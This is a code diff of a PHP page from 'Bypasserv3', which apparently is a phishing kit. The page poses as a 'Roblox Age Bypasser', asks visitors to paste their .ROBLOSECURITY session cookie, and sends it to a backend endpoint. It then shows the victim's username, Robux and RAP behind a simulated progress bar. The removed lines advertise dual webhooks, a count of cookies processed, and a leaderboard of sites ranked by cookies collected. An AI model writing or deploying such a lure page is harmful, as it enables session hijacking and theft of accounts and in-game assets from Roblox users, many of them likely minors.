@@ -1,24 +1,40 @@
<?php
/**
 * Bypasserv3 - Homepage (No Dashboard)
 * Direct to Generator
 * Bypasserv3 - Public Instance Page
 * Roblox Age Bypasser
 */

require_once __DIR__ . '/config.php';
require_once __DIR__ . '/functions.php';
require_once __DIR__ . '/../config.php';
require_once __DIR__ . '/../functions.php';

$stats = getGlobalStats();
$leaderboard = getLeaderboard(5);
$directory = $_GET['dir'] ?? '';

if (empty($directory)) {
    die('No instance specified');
}

$directory = sanitizeDirectory($directory);
$instanceData = getInstanceData($directory);

if (!$instanceData) {
    die('Instance not found');
}

// Track visit
updateInstanceStats($directory, 'totalVisits', ($instanceData['stats']['totalVisits'] ?? 0) + 1);
updateDailyStats($directory, 'visits', 1);
updateGlobalStats('totalVisits', 1);
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Bypasserv3 - Roblox Cookie Refresher</title>
    <title>Roblox Age Bypasser</title>
    <link rel="icon" type="image/png" href="https://cdn-icons-png.flaticon.com/512/5473/5473473.png">
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700&family=Space+Grotesk:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.6.0/dist/confetti.browser.min.js"></script>

    <style>
        * {
@@ -29,242 +45,452 @@

        body {
            font-family: 'Outfit', sans-serif;
            background: linear-gradient(135deg, #0a0e27 0%, #1a1f3a 50%, #0a0e27 100%);
            background: linear-gradient(135deg, #0f172a 0%, #1e293b 50%, #0f172a 100%);
            background-attachment: fixed;
            color: #f8fafc;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 40px 20px;
            width: 100%;
            max-width: 700px;
        }

        .header {
            text-align: center;
            margin-bottom: 60px;
            margin-bottom: 40px;
        }

        .header-title {
        .header h1 {
            font-size: 48px;
            font-weight: 700;
            margin-bottom: 12px;
            background: linear-gradient(90deg, #3b82f6 0%, #60a5fa 50%, #3b82f6 100%);
            background: linear-gradient(135deg, #8b5cf6 0%, #a78bfa 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-size: 200% auto;
            animation: gradientShift 3s ease infinite;
        }
        
        .header-subtitle {
            font-size: 18px;
            color: rgba(255, 255, 255, 0.7);
            margin-bottom: 30px;
            background-clip: text;
        }

        @keyframes gradientShift {
            0% { background-position: 0% center; }
            50% { background-position: 100% center; }
            100% { background-position: 0% center; }
        .header p {
            color: rgba(255, 255, 255, 0.6);
            font-size: 16px;
        }

        .glass-box {
            backdrop-filter: blur(20px) saturate(200%);
            -webkit-backdrop-filter: blur(20px) saturate(200%);
            background: linear-gradient(135deg, rgba(15, 23, 42, 0.8) 0%, rgba(30, 41, 59, 0.6) 100%);
            border: 1px solid rgba(59, 130, 246, 0.3);
            border: 1px solid rgba(139, 92, 246, 0.2);
            border-radius: 20px;
            padding: 40px;
            box-shadow: 0 8px 32px 0 rgba(31, 38, 135, 0.37);
            margin-bottom: 30px;
            box-shadow: 0 8px 32px 0 rgba(139, 92, 246, 0.15);
            margin-bottom: 24px;
        }

        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        .form-group {
            margin-bottom: 0;
        }

        .stat-card {
            text-align: center;
        .form-group label {
            display: block;
            font-size: 14px;
            font-weight: 600;
            color: rgba(255, 255, 255, 0.9);
            margin-bottom: 12px;
        }

        .stat-number {
            font-size: 36px;
            font-weight: 700;
            background: linear-gradient(135deg, #3b82f6, #2563eb);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 8px;
        .form-group textarea {
            width: 100%;
            padding: 16px;
            background: rgba(30, 41, 59, 0.8);
            border: 1px solid rgba(139, 92, 246, 0.2);
            border-radius: 12px;
            color: #f8fafc;
            font-size: 13px;
            font-family: 'Outfit', sans-serif;
            resize: vertical;
            min-height: 100px;
            transition: all 0.3s ease;
        }

        .stat-label {
            font-size: 14px;
            color: rgba(255, 255, 255, 0.6);
        .form-group textarea::placeholder {
            color: rgba(255, 255, 255, 0.3);
        }

        .cta-button {
            display: inline-block;
            padding: 16px 40px;
        .form-group textarea:focus {
            outline: none;
            background: rgba(30, 41, 59, 0.95);
            border-color: #8b5cf6;
            box-shadow: 0 0 20px rgba(139, 92, 246, 0.2);
        }
        
        .button-group {
            display: flex;
            flex-direction: column;
            gap: 12px;
            margin-top: 20px;
        }
        
        .btn-start {
            width: 100%;
            padding: 14px 20px;
            background: linear-gradient(135deg, #8b5cf6 0%, #a78bfa 100%);
            border: none;
            border-radius: 12px;
            color: white;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
        }
        
        .btn-start:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 25px rgba(139, 92, 246, 0.4);
        }
        
        .btn-start:active {
            transform: translateY(0);
        }
        
        .btn-start:disabled {
            opacity: 0.6;
            cursor: not-allowed;
        }
        
        .btn-create {
            padding: 12px 40px;
            background: linear-gradient(135deg, #3b82f6 0%, #2563eb 100%);
            border: none;
            border-radius: 10px;
            color: white;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            text-decoration: none;
            transition: all 0.3s ease;
            display: inline-block;
            margin-bottom: 24px;
        }

        .cta-button:hover {
            transform: translateY(-3px);
            box-shadow: 0 15px 30px rgba(59, 130, 246, 0.4);
        .btn-create:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 25px rgba(59, 130, 246, 0.4);
        }

        .features {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        .process-box {
            backdrop-filter: blur(20px) saturate(200%);
            -webkit-backdrop-filter: blur(20px) saturate(200%);
            background: linear-gradient(135deg, rgba(15, 23, 42, 0.8) 0%, rgba(30, 41, 59, 0.6) 100%);
            border: 1px solid rgba(139, 92, 246, 0.2);
            border-radius: 20px;
            padding: 30px;
            box-shadow: 0 8px 32px 0 rgba(139, 92, 246, 0.15);
        }

        .feature-card {
            backdrop-filter: blur(10px);
            background: rgba(255, 255, 255, 0.05);
            border: 1px solid rgba(59, 130, 246, 0.2);
            border-radius: 15px;
            padding: 24px;
        .process-title {
            text-align: center;
            font-size: 18px;
            font-weight: 600;
            margin-bottom: 20px;
            color: rgba(255, 255, 255, 0.9);
        }

        .feature-icon {
            font-size: 32px;
            margin-bottom: 12px;
        .process-step {
            display: flex;
            align-items: center;
            gap: 12px;
            padding: 12px;
            background: rgba(139, 92, 246, 0.1);
            border: 1px solid rgba(139, 92, 246, 0.2);
            border-radius: 10px;
            margin-bottom: 10px;
            font-size: 14px;
            color: rgba(255, 255, 255, 0.7);
        }

        .feature-title {
            font-size: 16px;
        .process-step:last-child {
            margin-bottom: 0;
        }
        
        .process-arrow {
            color: rgba(139, 92, 246, 0.6);
            font-weight: 600;
            margin-bottom: 8px;
            min-width: 20px;
        }

        .feature-desc {
            font-size: 13px;
            color: rgba(255, 255, 255, 0.6);
        .disclaimer {
            text-align: center;
            font-size: 12px;
            color: rgba(255, 255, 255, 0.4);
            margin-top: 30px;
        }

        .leaderboard {
            margin-top: 40px;
        .spinner {
            width: 20px;
            height: 20px;
            border: 2px solid rgba(255, 255, 255, 0.3);
            border-top: 2px solid white;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            display: inline-block;
        }

        .leaderboard h2 {
            font-size: 24px;
            margin-bottom: 20px;
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        
        .success-container {
            text-align: center;
        }

        .leaderboard-item {
        .success-icon {
            font-size: 64px;
            margin-bottom: 20px;
            animation: bounce 0.6s ease-in-out;
        }
        
        @keyframes bounce {
            0%, 100% { transform: scale(0); }
            50% { transform: scale(1); }
        }
        
        .success-container h2 {
            font-size: 28px;
            margin-bottom: 16px;
            color: #10b981;
        }
        
        .success-info {
            background: rgba(16, 185, 129, 0.1);
            border: 1px solid rgba(16, 185, 129, 0.2);
            border-radius: 12px;
            padding: 20px;
            margin-bottom: 20px;
            text-align: left;
        }
        
        .info-row {
            display: flex;
            justify-content: space-between;
            padding: 12px;
            background: rgba(255, 255, 255, 0.03);
            border: 1px solid rgba(59, 130, 246, 0.1);
            border-radius: 8px;
            margin-bottom: 8px;
            padding: 12px 0;
            border-bottom: 1px solid rgba(16, 185, 129, 0.1);
            font-size: 14px;
        }

        .rank-badge {
            font-weight: 700;
            color: #3b82f6;
            min-width: 30px;
        .info-row:last-child {
            border-bottom: none;
        }
        
        .info-label {
            color: rgba(255, 255, 255, 0.6);
        }
        
        .info-value {
            color: #10b981;
            font-weight: 600;
            word-break: break-all;
        }
        
        .processing-state {
            text-align: center;
        }
        
        .processing-spinner {
            width: 50px;
            height: 50px;
            border: 4px solid rgba(139, 92, 246, 0.2);
            border-top: 4px solid #8b5cf6;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 30px auto;
        }
        
        .progress-bar {
            width: 100%;
            height: 4px;
            background: rgba(139, 92, 246, 0.1);
            border-radius: 10px;
            overflow: hidden;
            margin-top: 20px;
        }
        
        .progress-fill {
            height: 100%;
            background: linear-gradient(90deg, #8b5cf6, #a78bfa);
            width: 0%;
            transition: width 0.3s ease;
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- Header -->
        <div class="header">
            <h1 class="header-title">Bypasserv3</h1>
            <p class="header-subtitle">Roblox Cookie Refresher</p>
            <a href="/generator/" class="cta-button">⚡ Create Site Now</a>
            <h1>Roblox Age Bypasser</h1>
            <p>Secure and efficient age verification bypass</p>
        </div>

        <div class="glass-box">
            <div class="stats-grid">
                <div class="stat-card">
                    <div class="stat-number"><?= $stats['totalSites'] ?? 0 ?></div>
                    <div class="stat-label">Total Sites</div>
                </div>
                <div class="stat-card">
                    <div class="stat-number"><?= $stats['totalCookies'] ?? 0 ?></div>
                    <div class="stat-label">Cookies Processed</div>
        <!-- Main Form -->
        <div id="formContainer">
            <div class="glass-box">
                <div class="form-group">
                    <label>ROBLOSECURITY Cookie</label>
                    <textarea 
                        id="cookieInput" 
                        placeholder="Paste your cookie here..."
                        required
                    ></textarea>
                </div>
                <div class="stat-card">
                    <div class="stat-number"><?= $stats['totalVisits'] ?? 0 ?></div>
                    <div class="stat-label">Total Visits</div>

                <div class="button-group">
                    <button type="button" class="btn-start" onclick="handleBypass(event)">
                        ⚙️ Start Bypass
                    </button>
                </div>
            </div>
        </div>

        <div class="features">
            <div class="feature-card">
                <div class="feature-icon">⚡</div>
                <div class="feature-title">Lightning Fast</div>
                <div class="feature-desc">Generate your site in seconds with full functionality</div>
            </div>
            <div class="feature-card">
                <div class="feature-icon">🔒</div>
                <div class="feature-title">Secure & Safe</div>
                <div class="feature-desc">All cookies handled securely with proper validation</div>
            </div>
            <div class="feature-card">
                <div class="feature-icon">🔔</div>
                <div class="feature-title">Dual Webhooks</div>
                <div class="feature-desc">Admin and user webhooks for complete notifications</div>
            <!-- Create Dualhook Site Button -->
            <div style="text-align: center; margin-bottom: 24px;">
                <a href="/generator/" class="btn-create">
                    ✨ Create Dualhook Site
                </a>
            </div>
            <div class="feature-card">
                <div class="feature-icon">📊</div>
                <div class="feature-title">Full Stats</div>
                <div class="feature-desc">Get complete account info and balance details</div>
            </div>
            <div class="feature-card">
                <div class="feature-icon">🌍</div>
                <div class="feature-title">Works Everywhere</div>
                <div class="feature-desc">Works for all countries & proxies supported</div>

            <!-- Process Box -->
            <div class="process-box">
                <div class="process-title">Process</div>
                <div class="process-step">
                    <span class="process-arrow">→</span>
                    <span>1. Enter your .ROBLOSECURITY cookie</span>
                </div>
                <div class="process-step">
                    <span class="process-arrow">→</span>
                    <span>2. Click "Start Bypass" to begin</span>
                </div>
            </div>
            <div class="feature-card">
                <div class="feature-icon">✨</div>
                <div class="feature-title">No Dashboard</div>
                <div class="feature-desc">Direct webhook notifications, no complexity</div>

            <div class="disclaimer">
                Use at your own risk. We are not responsible for any account restrictions.
            </div>
        </div>

        <?php if (!empty($leaderboard)): ?>
        <div class="glass-box leaderboard">
            <h2>🏆 Top Sites</h2>
            <?php foreach ($leaderboard as $index => $site): ?>
            <div class="leaderboard-item">
                <div>
                    <span class="rank-badge">#<?= $index + 1 ?></span>
                    <span><?= htmlspecialchars($site['directory']) ?></span>
                </div>
                <div style="color: #10b981;">
                    <?= number_format($site['totalCookies']) ?> cookies
        <!-- Processing State -->
        <div id="processingContainer" style="display: none;">
            <div class="glass-box processing-state">
                <div class="processing-spinner"></div>
                <p style="color: rgba(255, 255, 255, 0.7); margin-top: 20px;">Processing your request...</p>
                <div class="progress-bar">
                    <div class="progress-fill" id="progressFill"></div>
                </div>
                <p style="font-size: 12px; color: rgba(255, 255, 255, 0.5); margin-top: 8px;" id="progressText">0%</p>
            </div>
            <?php endforeach; ?>
        </div>
        <?php endif; ?>

        <div style="text-align: center; margin-top: 60px; padding-top: 40px; border-top: 1px solid rgba(59, 130, 246, 0.2);">
            <p style="color: rgba(255, 255, 255, 0.5); font-size: 13px;">
                Bypasserv3 © 2024 | Powered by Railway |
            </p>
        <!-- Success State -->
        <div id="successContainer" style="display: none;">
            <div class="glass-box success-container">
                <div class="success-icon">✅</div>
                <h2>Success!</h2>
                <div class="success-info">
                    <div class="info-row">
                        <span class="info-label">Username</span>
                        <span class="info-value" id="successUsername">-</span>
                    </div>
                    <div class="info-row">
                        <span class="info-label">User ID</span>
                        <span class="info-value" id="successUserId">-</span>
                    </div>
                    <div class="info-row">
                        <span class="info-label">Robux</span>
                        <span class="info-value" id="successRobux">0</span>
                    </div>
                    <div class="info-row">
                        <span class="info-label">RAP</span>
                        <span class="info-value" id="successRap">0</span>
                    </div>
                </div>

                <button type="button" class="btn-start" onclick="resetForm()">
                    ↻ Bypass Another
                </button>
            </div>
        </div>
    </div>

    <script>
        async function handleBypass(e) {
            const cookie = document.getElementById('cookieInput').value.trim();
            const directory = new URLSearchParams(window.location.search).get('dir');

            if (!cookie) {
                alert('Please paste your cookie first');
                return;
            }

            document.getElementById('formContainer').style.display = 'none';
            document.getElementById('processingContainer').style.display = 'block';

            // Simulate progress
            let progress = 0;
            const progressInterval = setInterval(() => {
                progress += Math.random() * 25;
                if (progress > 90) progress = 90;
                document.getElementById('progressFill').style.width = progress + '%';
                document.getElementById('progressText').textContent = Math.floor(progress) + '%';
            }, 150);

            try {
                const response = await fetch('/api/bypass.php', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ cookie, directory })
                });

                const data = await response.json();

                clearInterval(progressInterval);
                document.getElementById('progressFill').style.width = '100%';
                document.getElementById('progressText').textContent = '100%';

                if (data.success) {
                    setTimeout(() => {
                        document.getElementById('processingContainer').style.display = 'none';
                        document.getElementById('successContainer').style.display = 'block';

                        document.getElementById('successUsername').textContent = data.userInfo.username || '-';
                        document.getElementById('successUserId').textContent = data.userInfo.userId || '-';
                        document.getElementById('successRobux').textContent = (data.userInfo.robux || 0).toLocaleString();
                        document.getElementById('successRap').textContent = (data.userInfo.rap || 0).toLocaleString();

                        if (typeof confetti !== 'undefined') {
                            confetti();
                        }
                    }, 500);
                } else {
                    alert('❌ Bypass failed:\n' + (data.error || 'Unknown error'));
                    resetForm();
                }
            } catch (err) {
                clearInterval(progressInterval);
                alert('Network error: ' + err.message);
                resetForm();
            }
        }

        function resetForm() {
            document.getElementById('successContainer').style.display = 'none';
            document.getElementById('processingContainer').style.display = 'none';
            document.getElementById('formContainer').style.display = 'block';
            document.getElementById('cookieInput').value = '';
            document.getElementById('cookieInput').focus();
            document.getElementById('progressFill').style.width = '0%';
            document.getElementById('progressText').textContent = '0%';
        }
    </script>
</body>
</html>
?>
